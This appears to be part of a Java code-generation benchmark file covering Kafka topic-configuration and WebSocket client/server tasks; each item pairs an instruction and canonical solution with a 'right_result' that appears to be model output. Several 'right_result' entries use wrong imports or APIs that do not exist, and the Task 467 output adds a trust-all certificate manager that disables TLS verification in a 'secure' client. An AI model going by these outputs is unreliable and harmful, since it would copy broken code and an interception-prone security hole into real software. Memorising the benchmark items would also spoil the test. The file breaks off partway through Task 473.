    "Instruction": "Task Description: Retrieve the configurations of specified Kafka topics using the Kafka AdminClient API.\n\nFunction Description: This function connects to a Kafka cluster using the provided bootstrap servers and retrieves the configurations for the specified topic names. It utilizes the Kafka AdminClient to describe the configurations and returns them as a map of ConfigResource to Config objects.\n\nInput: \n- bootstrapServers: [String] - Comma-separated list of host/port pairs to use for establishing the initial connection to the Kafka cluster.\n- topicNames: [String[]] - Array of topic names for which configurations need to be retrieved.\n\nOutput: \n- [Map<ConfigResource, Config>] - A map where keys are ConfigResource objects representing the topics, and values are Config objects containing the configuration entries for each topic. The operation will timeout after 3 seconds if the configuration retrieval is not completed.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\n\npublic Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) throws Exception {\n    Map<String, Object> adminClientConfig = new HashMap<>();\n    adminClientConfig.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminClientConfig);\n    \n    ConfigResource[] configResources = Arrays.stream(topicNames)\n        .map(topicName -> new ConfigResource(ConfigResource.Type.TOPIC, topicName))\n        .toArray(ConfigResource[]::new);\n        \n    DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(Arrays.asList(configResources));\n    return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 36,
    "right_result": "import org.apache.kafka.common.config.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.errors.TimeoutException;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.ListableConfig;\nimport java.util.*;\nimport java.util.concurrent.TimeUnit;\n\npublic class KafkaConfigRetriever {\n    public static Map<ConfigResource, Config> retrieveTopicConfigurations(String bootstrapServers, String[] topicNames) {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(AdminClientConfig.REQUEST_TIMEOUT_MS_CONFIG, 3000);\n\n        try (AdminClient adminClient = AdminClient.create(props)) {\n            DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(\n                Arrays.stream(topicNames)\n                      .map(topic -> new ConfigResource(ConfigResource.Type.TOPIC, topic))\n                      .collect(Collectors.toList())\n            );\n\n            return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n        } catch (TimeoutException e) {\n            throw new RuntimeException(\"Configuration retrieval timed out\", e);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Error retrieving configurations\", e);\n        }\n    }\n}"
  },
  {
    "Task_id": 456,
    "Instruction": "Task Description: Create a Java class that provides administrative operations for Kafka topics, including retrieving configurations for individual topics, multiple topics, and all topics in a Kafka cluster.\n\nClass Description: The KafkaAdminTopicConfigProvider class is designed to interact with Kafka's AdminClient to perform topic configuration operations. It provides methods to fetch topic configurations either for a single topic, a set of topics, or all topics in the cluster. The class handles timeouts and errors gracefully and converts Kafka Config objects into standard Java Properties objects.\n\nAttributes:\n- _clusterConfigs: [Properties] - Stores configuration properties for the Kafka cluster\n- _adminClient: [AdminClient] - The Kafka AdminClient instance used to perform administrative operations\n- DESCRIBE_CLUSTER_CONFIGS_TIMEOUT: [Duration] - Constant defining the timeout duration for describeConfigs operations (90 seconds)\n- LOG: [Logger] - Logger instance for logging debug and warning messages\n\nMethods:\n- topicConfigs: [String topic] -> [Properties] - Retrieves configuration properties for a single specified topic. Returns empty Properties if retrieval fails.\n- topicConfigs: [Set<String> topics] -> [Map<String, Properties>] - Retrieves configurations for multiple topics specified in the input set. Returns a map of topic names to their configurations.\n- allTopicConfigs: [] -> [Map<String, Properties>] - Retrieves configurations for all topics in the Kafka cluster. Returns an empty map if retrieval fails.\n- convertConfigToProperties: [Config config] -> [Properties] - Helper method that converts a Kafka Config object into a Java Properties object, filtering out null entries.",
    "Canonical_solution": "import java.time.Duration;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.Set;\nimport java.util.concurrent.ExecutionException;\nimport java.util.stream.Collectors;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.clients.admin.ConfigEntry;\nimport org.apache.kafka.common.KafkaFuture;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.protocol.Errors;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class KafkaAdminTopicConfigProvider {\n  private static final Logger LOG = LoggerFactory.getLogger(KafkaAdminTopicConfigProvider.class);\n  public static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n  protected Properties _clusterConfigs;\n  protected AdminClient _adminClient;\n\n  public Properties topicConfigs(String topic) {\n    Config topicConfig = null;\n    ConfigResource topicResource = new ConfigResource(ConfigResource.Type.TOPIC, topic);\n    try {\n      LOG.debug(\"Requesting details for topic '{}'\", topic);\n      topicConfig = _adminClient\n              .describeConfigs(Collections.singletonList(topicResource))\n              .all()\n              .get()\n              .get(topicResource);\n    } catch (ExecutionException ee) {\n      if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n        LOG.warn(\"Failed to retrieve configuration for topic '{}' due to describeConfigs request time out.\", topic);\n      } else {\n        LOG.warn(\"Cannot retrieve configuration for topic '{}'.\", topic, ee);\n      }\n    } catch (InterruptedException ie) {\n      LOG.debug(\"Interrupted while getting configuration for topic '{}'.\", topic, ie);\n    }\n\n    if (topicConfig != null) {\n      return convertConfigToProperties(topicConfig);\n    } else {\n      LOG.warn(\"The configuration for topic '{}' could not be retrieved, returning empty Properties instance.\", topic);\n      return new Properties();\n    }\n  }\n\n  public Map<String, Properties> topicConfigs(Set<String> topics) {\n    Map<ConfigResource, KafkaFuture<Config>> topicConfigs;\n    topicConfigs = _adminClient.describeConfigs(\n            topics.stream().map(name -> new ConfigResource(ConfigResource.Type.TOPIC, name)).collect(Collectors.toList())\n    ).values();\n\n    Map<String, Properties> propsMap = new HashMap<>();\n    if (topicConfigs != null) {\n      for (Map.Entry<ConfigResource, KafkaFuture<Config>> entry : topicConfigs.entrySet()) {\n        try {\n          Config config = entry.getValue().get();\n          propsMap.put(entry.getKey().name(), convertConfigToProperties(config));\n        } catch (ExecutionException ee) {\n          if (Errors.REQUEST_TIMED_OUT.exception().getClass() == ee.getCause().getClass()) {\n            LOG.warn(\"Failed to retrieve config for topics due to describeConfigs request timing out.\");\n            break;\n          } else {\n            LOG.debug(\"Cannot retrieve config for topic {}.\", entry.getKey().name(), ee);\n          }\n        } catch (InterruptedException ie) {\n          LOG.debug(\"Interrupted while getting config for topic {}.\", entry.getKey().name(), ie);\n        }\n      }\n    }\n    return propsMap;\n  }\n\n  public Map<String, Properties> allTopicConfigs() {\n    LOG.debug(\"Requesting configurations for all topics\");\n    Set<String> topicNames = null;\n    try {\n      topicNames = _adminClient.listTopics().names().get();\n    } catch (InterruptedException | ExecutionException e) {\n      LOG.warn(\"Unable to obtain list of all topic names from the Kafka Cluster\");\n    }\n\n    if (topicNames == null) {\n      return Collections.emptyMap();\n    } else {\n      return topicConfigs(topicNames);\n    }\n  }\n\n  protected static Properties convertConfigToProperties(Config config) {\n    Properties props = new Properties();\n    for (ConfigEntry entry : config.entries()) {\n      if (entry.name() == null || entry.value() == null) {\n        continue;\n      }\n      props.put(entry.name(), entry.value());\n    }\n    return props;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "right_result": "import org.apache.kafka.common.config.Config;\nimport org.apache.kafka.common.config.ConfigException;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.ListTopicsResult;\nimport org.apache.kafka.common.KafkaException;\nimport org.apache.kafka.common.TopicPartitionInfo;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.utils.Utils;\nimport java.time.Duration;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\nimport java.util.logging.Logger;\n\npublic class KafkaAdminTopicConfigProvider {\n    private final Properties _clusterConfigs;\n    private final AdminClient _adminClient;\n    private static final Duration DESCRIBE_CLUSTER_CONFIGS_TIMEOUT = Duration.ofSeconds(90);\n    private static final Logger LOG = Logger.getLogger(KafkaAdminTopicConfigProvider.class.getName());\n\n    public KafkaAdminTopicConfigProvider(Properties clusterConfigs) {\n        this._clusterConfigs = clusterConfigs;\n        this._adminClient = AdminClient.create(_clusterConfigs);\n    }\n\n    public Properties topicConfigs(String topic) {\n        try {\n            DescribeConfigsResult describeResult = _adminClient.describeConfigs(Collections.singletonList(new ConfigResource(ConfigResource.Type.TOPIC, topic)));\n            Map<String, Config> configs = describeResult.all().get(DESCRIBE_CLUSTER_CONFIGS_TIMEOUT.toMillis(), java.util.concurrent.TimeUnit.MILLISECONDS);\n            if (configs.containsKey(topic)) {\n                return convertConfigToProperties(configs.get(topic));\n            }\n            return new Properties();\n        } catch (InterruptedException | ExecutionException | TimeoutException e) {\n            LOG.warning(\"Failed to retrieve configuration for topic: \" + topic + \". Error: \" + e.getMessage());\n            return new Properties();\n        }\n    }\n\n    public Map<String, Properties> topicConfigs(Set<String> topics) {\n        Map<String, Properties> result = new HashMap<>();\n        for (String topic : topics) {\n            Properties props = topicConfigs(topic);\n            if (!props.isEmpty()) {\n                result.put(topic, props);\n            }\n        }\n        return result;\n    }\n\n    public Map<String, Properties> allTopicConfigs() {\n        try {\n            ListTopicsResult listTopicsResult = _adminClient.listTopics();\n            Set<String> topics = listTopicsResult.names().get(DESCRIBE_CLUSTER_CONFIGS_TIMEOUT.toMillis(), java.util.concurrent.TimeUnit.MILLISECONDS);\n            Map<String, Properties> allConfigs = new HashMap<>();\n            for (String topic : topics) {\n                Properties props = topicConfigs(topic);\n                if (!props.isEmpty()) {\n                    allConfigs.put(topic, props);\n                }\n            }\n            return allConfigs;\n        } catch (InterruptedException | ExecutionException | TimeoutException e) {\n            LOG.warning(\"Failed to retrieve configurations for all topics. Error: \" + e.getMessage());\n            return new HashMap<>();\n        }\n    }\n\n    private Properties convertConfigToProperties(Config config) {\n        Properties props = new Properties();\n        if (config != null) {\n            for (Map.Entry<String, Object> entry : config.originalEntries().entrySet()) {\n                String key = entry.getKey();\n                Object value = entry.getValue();\n                if (value != null) {\n                    props.setProperty(key, value.toString());\n                }\n            }\n        }\n        return props;\n    }\n}"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Implement a Kafka topic administration utility class that provides functionality to describe Kafka topics using the AdminClient API.\n\nClass Description: The `KafkaTopicAdmin` class is a utility class designed to interact with Apache Kafka's administrative API. It provides methods to perform administrative operations on Kafka topics, specifically focusing on describing topic configurations. The class handles connection management and timeout configurations for administrative operations.\n\nAttributes:\n- configs: [Map<String, Object>] - Configuration properties for connecting to the Kafka cluster (e.g., bootstrap servers, security settings)\n- operationTimeout: [int] - Timeout duration in seconds for administrative operations\n\nMethods:\n- describeTopics: [describeTopics](String... topicNames) -> Map<String, TopicDescription> - Describes the specified Kafka topics by returning their configurations including partition count, replication factor, and other metadata. Throws KafkaException for operation failures or interruptions.\n- createAdmin: [createAdmin]() -> Admin - Creates and returns an AdminClient instance using the configured properties. Protected method for internal use.\n- getAdminConfig: [getAdminConfig]() -> Map<String, Object> - Returns a copy of the admin client configuration. Protected method for internal use.\n\nThe class implements AutoCloseable behavior through the AdminClient resource management in the describeTopics method, ensuring proper cleanup of resources. It handles various failure scenarios including timeouts, execution exceptions, and thread interruptions by wrapping them in appropriate KafkaException instances.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.Admin;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.springframework.kafka.KafkaException;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaTopicAdmin {\n\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        try (Admin admin = createAdmin()) {\n            Map<String, TopicDescription> results = new HashMap<>();\n            DescribeTopicsResult topics = admin.describeTopics(Arrays.asList(topicNames));\n            try {\n                results.putAll(topics.allTopicNames().get(this.operationTimeout, TimeUnit.SECONDS));\n                return results;\n            }\n            catch (InterruptedException ie) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted while getting topic descriptions\", ie);\n            }\n            catch (TimeoutException | ExecutionException ex) {\n                throw new KafkaException(\"Failed to obtain topic descriptions\", ex);\n            }\n        }\n    }\n\n    protected Admin createAdmin() {\n        return AdminClient.create(getAdminConfig());\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        final Map<String, Object> configs2 = new HashMap<>(this.configs);\n        return configs2;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "right_result": "import org.apache.kafka.clients.admin.Admin;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.apache.kafka.common.config.ConfigException;\nimport org.apache.kafka.common.utils.SystemTime;\n\nimport java.time.Duration;\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.stream.Collectors;\n\npublic class KafkaTopicAdmin implements AutoCloseable {\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = configs;\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) throws KafkaException {\n        try (Admin admin = createAdmin()) {\n            DescribeTopicsResult result = admin.describeTopics(Arrays.asList(topicNames));\n            Map<String, TopicDescription> topicDescriptions = new HashMap<>();\n            for (Map.Entry<String, TopicDescription> entry : result.all().get(operationTimeout, TimeUnit.SECONDS)) {\n                topicDescriptions.put(entry.getKey(), entry.getValue());\n            }\n            return topicDescriptions;\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new KafkaException(\"Operation interrupted\", e);\n        } catch (ExecutionException | RuntimeException e) {\n            throw new KafkaException(\"Failed to describe topics\", e);\n        } catch (Exception e) {\n            throw new KafkaException(\"Unexpected error during topic description\", e);\n        }\n    }\n\n    protected Admin createAdmin() {\n        return Admin.create(getAdminConfig());\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        return new HashMap<>(configs);\n    }\n\n    @Override\n    public void close() {\n        // No-op as AdminClient is closed via try-with-resources\n    }\n\n    static class KafkaException extends RuntimeException {\n        KafkaException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n}"
  },
  {
    "Task_id": 464,
    "Instruction": "Task Description: Implement a WebSocket client class that handles secure WebSocket connections with custom SSL configuration and event delegation.\n\nClass Description: WebSocketTransport is a WebSocket client implementation that extends the WebSocketClient class from the org.java_websocket library. It manages WebSocket connections with optional SSL/TLS encryption and delegates connection events to a listener interface. The class handles connection establishment, message reception, and connection termination events.\n\nAttributes:\n- CONNECT_TIMEOUT: int - Static constant defining the connection timeout in milliseconds (5000ms)\n- webSocketListener: WebSocketListener - Interface reference for handling WebSocket events (open, message, close, error)\n\nMethods:\n- WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) -> None - Constructor that initializes the WebSocket client with server URI, SSL properties, custom headers, and event listener. Throws URISyntaxException for invalid URIs.\n- onOpen(ServerHandshake serverHandshake) -> void - Callback when WebSocket connection is established. Delegates to webSocketListener.\n- onMessage(String s) -> void - Callback when a text message is received. Delegates to webSocketListener.\n- onClose(int code, String reason, boolean remote) -> void - Callback when connection is closed. Delegates to webSocketListener.\n- onError(Exception e) -> void - Callback when an error occurs. Delegates to webSocketListener.",
    "Canonical_solution": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\nimport javax.net.ssl.SSLSocketFactory;\n\nimport org.apache.servicecomb.foundation.ssl.SSLManager;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class WebSocketTransport extends WebSocketClient {\n  public static final int CONNECT_TIMEOUT = 5000;\n\n  private final WebSocketListener webSocketListener;\n\n  public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties,\n      Map<String, String> headers, WebSocketListener webSocketListener)\n      throws URISyntaxException {\n    super(new URI(serverUri), new Draft_6455(), headers, CONNECT_TIMEOUT);\n\n    if (sslProperties.isEnabled()) {\n      SSLSocketFactory sslSocketFactory = SSLManager\n          .createSSLSocketFactory(sslProperties.getSslOption(), sslProperties.getSslCustom());\n      URI uri = new URI(serverUri);\n      setSocketFactory(new SSLSocketFactoryExt(sslSocketFactory, uri.getHost(), uri.getPort()));\n    }\n\n    this.webSocketListener = webSocketListener;\n  }\n\n  @Override\n  public void onOpen(ServerHandshake serverHandshake) {\n    this.webSocketListener.onOpen(serverHandshake);\n  }\n\n  @Override\n  public void onMessage(String s) {\n    this.webSocketListener.onMessage(s);\n  }\n\n  @Override\n  public void onClose(int code, String reason, boolean remote) {\n    this.webSocketListener.onClose(code, reason, remote);\n  }\n\n  @Override\n  public void onError(Exception e) {\n    this.webSocketListener.onError(e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport org.java_websocket.http.HttpConfiguration;\nimport org.java_websocket.http.HttpRequest;\nimport org.java_websocket.http.HttpResponse;\nimport org.java_websocket.util.SocketUtils;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.Map;\n\npublic class WebSocketTransport extends WebSocketClient {\n    public static final int CONNECT_TIMEOUT = 5000;\n    private final WebSocketListener webSocketListener;\n\n    public WebSocketTransport(String serverUri, HttpConfiguration.SSLProperties sslProperties, Map<String, String> headers, WebSocketListener webSocketListener) throws URISyntaxException {\n        super(new URI(serverUri), headers);\n        this.webSocketListener = webSocketListener;\n        if (sslProperties != null && sslProperties.isUseSSL()) {\n            SSLContext sslContext = SocketUtils.createSSLContext(sslProperties.getTrustStorePath(), sslProperties.getTrustStorePassword(), sslProperties.getKeyStorePath(), sslProperties.getKeyStorePassword(), sslProperties.getKeyManagerAlgorithm(), sslProperties.getTrustManagerAlgorithm());\n            SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();\n            setSocketFactory(sslSocketFactory);\n        }\n        setConnectTimeout(CONNECT_TIMEOUT);\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshake) {\n        webSocketListener.onOpen(handshake);\n    }\n\n    @Override\n    public void onMessage(String message) {\n        webSocketListener.onMessage(message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        webSocketListener.onClose(code, reason, remote);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        webSocketListener.onError(ex);\n    }\n}"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Implement a secure WebSocket client class in Java that supports SSL/TLS with configurable endpoint identification algorithm for secure communication.\n\nClass Description: SSLWebSocketClient is a WebSocket client implementation that extends the WebSocketClient class from org.java_websocket library. It provides SSL/TLS support with customizable endpoint identification algorithm for secure WebSocket connections. The class includes event handlers for WebSocket lifecycle events and SSL-specific error handling.\n\nAttributes:\n- endpointIdentificationAlgorithm: String - The algorithm used for endpoint identification during SSL handshake\n- onSSLError: boolean - Flag indicating whether an SSL error occurred during connection\n- onOpen: boolean - Flag indicating whether the WebSocket connection was successfully opened\n\nMethods:\n- SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) -> None - Constructor that initializes the WebSocket client with server address, port, and endpoint identification algorithm\n- onOpen(ServerHandshake handshakedata) -> void - Callback triggered when WebSocket connection is successfully opened\n- onMessage(String message) -> void - Callback triggered when a message is received from the server\n- onClose(int code, String reason, boolean remote) -> void - Callback triggered when WebSocket connection is closed\n- onError(Exception ex) -> void - Callback triggered when an error occurs, with special handling for SSL errors\n- onSetSSLParameters(SSLParameters sslParameters) -> void - Override method to configure SSL parameters including endpoint identification algorithm",
    "Canonical_solution": "import java.net.URI;\nimport javax.net.ssl.SSLParameters;\nimport org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n\n    private final String endpointIdentificationAlgorithm;\n    public boolean onSSLError = false;\n    public boolean onOpen = false;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm)\n        throws java.net.URISyntaxException {\n        super(new URI(\"wss://\" + address + ':' + port));\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        this.onOpen = true;\n    }\n\n    @Override\n    public void onMessage(String message) {\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex instanceof javax.net.ssl.SSLHandshakeException) {\n            this.onSSLError = true;\n        }\n    }\n\n    @Override\n    protected void onSetSSLParameters(SSLParameters sslParameters) {\n        super.onSetSSLParameters(sslParameters);\n        if (endpointIdentificationAlgorithm != null) {\n            sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 27,
    "right_result": "import org.java_websocket.client.WebSocketClient;\nimport org.java_websocket.handshake.ServerHandshake;\nimport javax.net.ssl.SSLParameters;\nimport javax.net.ssl.SSLEngine;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\nimport java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport java.util.concurrent.TimeUnit;\n\npublic class SSLWebSocketClient extends WebSocketClient {\n    private String endpointIdentificationAlgorithm;\n    private boolean onSSLError;\n    private boolean onOpen;\n\n    public SSLWebSocketClient(String address, int port, String endpointIdentificationAlgorithm) {\n        super(address, port);\n        this.endpointIdentificationAlgorithm = endpointIdentificationAlgorithm;\n        configureSSL();\n    }\n\n    @Override\n    public void onOpen(ServerHandshake handshakedata) {\n        onOpen = true;\n        System.out.println(\"WebSocket connection opened\");\n    }\n\n    @Override\n    public void onMessage(String message) {\n        System.out.println(\"Received message: \" + message);\n    }\n\n    @Override\n    public void onClose(int code, String reason, boolean remote) {\n        System.out.println(\"WebSocket connection closed: \" + reason);\n    }\n\n    @Override\n    public void onError(Exception ex) {\n        if (ex.getMessage().contains(\"SSL\")) {\n            onSSLError = true;\n            System.err.println(\"SSL error occurred: \" + ex.getMessage());\n        } else {\n            System.err.println(\"Error occurred: \" + ex.getMessage());\n        }\n    }\n\n    @Override\n    public void onSetSSLParameters(SSLParameters sslParameters) {\n        try {\n            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n            sslContext.init(null, new TrustManager[]{new X509TrustManager() {\n                public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {}\n                public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {}\n                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n            }}, null);\n\n            SSLEngine sslEngine = sslContext.createSSLEngine();\n            sslEngine.setUseClientMode(true);\n            sslEngine.setEnableSessionCreation(true);\n            sslEngine.setWantClientAuth(false);\n            sslEngine.setNeedClientAuth(false);\n            sslEngine.setEnableAlpnProtocolNegotiation(true);\n\n            sslParameters.setEndpointIdentificationAlgorithm(endpointIdentificationAlgorithm);\n            sslParameters.setProtocols(new String[]{\"TLSv1.2\"});\n            sslParameters.setCipherSuites(new String[]{\"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\"});\n            sslParameters.setSSLContext(sslContext);\n            sslParameters.setSSLEngine(sslEngine);\n        } catch (Exception e) {\n            System.err.println(\"Failed to set SSL parameters: \" + e.getMessage());\n        }\n    }\n}"
  },
  {
    "Task_id": 469,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors, with synchronization support using CountDownLatch.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from org.java_websocket. It manages client connections and messages while providing synchronization points for server startup and message reception using CountDownLatch.\n\nAttributes:\ncountServerLatch: [CountDownLatch] - Synchronization aid to signal when the server has started  \ncountClientMessageLatch: [CountDownLatch] - Synchronization aid to signal when a client message is received  \n\nMethods:\nConstructor: [MyWebSocketServer](int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) -> [void] - Initializes the WebSocket server with specified port and synchronization latches  \nonOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Callback for new client connections  \nonClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Callback for client disconnections  \nonMessage: [onMessage](WebSocket conn, String message) -> [void] - Callback for processing received messages (decrements message latch)  \nonError: [onError](WebSocket conn, Exception ex) -> [void] - Callback for error handling (prints stack trace)  \nonStart: [onStart]() -> [void] - Callback when server starts (decrements server latch)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch,\n        CountDownLatch countClientMessageLatch) {\n        super(new InetSocketAddress(port));\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    private final CountDownLatch countServerLatch;\n    private final CountDownLatch countClientMessageLatch;\n\n    public MyWebSocketServer(int port, CountDownLatch serverDownLatch, CountDownLatch countClientMessageLatch) {\n        super(port);\n        this.countServerLatch = serverDownLatch;\n        this.countClientMessageLatch = countClientMessageLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"Client connected: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Client disconnected: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress() + \": \" + message);\n        countClientMessageLatch.countDown();\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started on port \" + getPort());\n        countServerLatch.countDown();\n    }\n}"
  },
  {
    "Task_id": 473,
    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library.\n\nClass Description: The SocketActivation class extends WebSocketServer to create a custom WebSocket server. It manages client connections, broadcasts messages to all connected clients, and handles server lifecycle events. The server tracks the number of connected clients and shuts down when no clients remain.\n\nAttributes:\n- clients: AtomicInteger - Tracks the number of currently connected clients\n\nMethods:\n- SocketActivation(ServerSocketChannel chan) -> None - Constructor that initializes the WebSocket server with the given ServerSocketChannel\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Handles new client connections, sends welcome message, and broadcasts connection event\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Handles client disconnections, broadcasts departure event, and shuts down server if no clients remain\n- onMessage(WebSocket conn, String message) -> None - Broadcasts received text messages to all clients and logs the message\n- onMessage(WebSocket conn, ByteBuffer message) -> None - Broadcasts received binary messages to all clients and logs the message\n- onError(WebSocket conn, Exception ex) -> None - Handles and logs any errors that occur during WebSocket operations\n- onStart() -> None - Called when the server starts successfully, logs server startup",
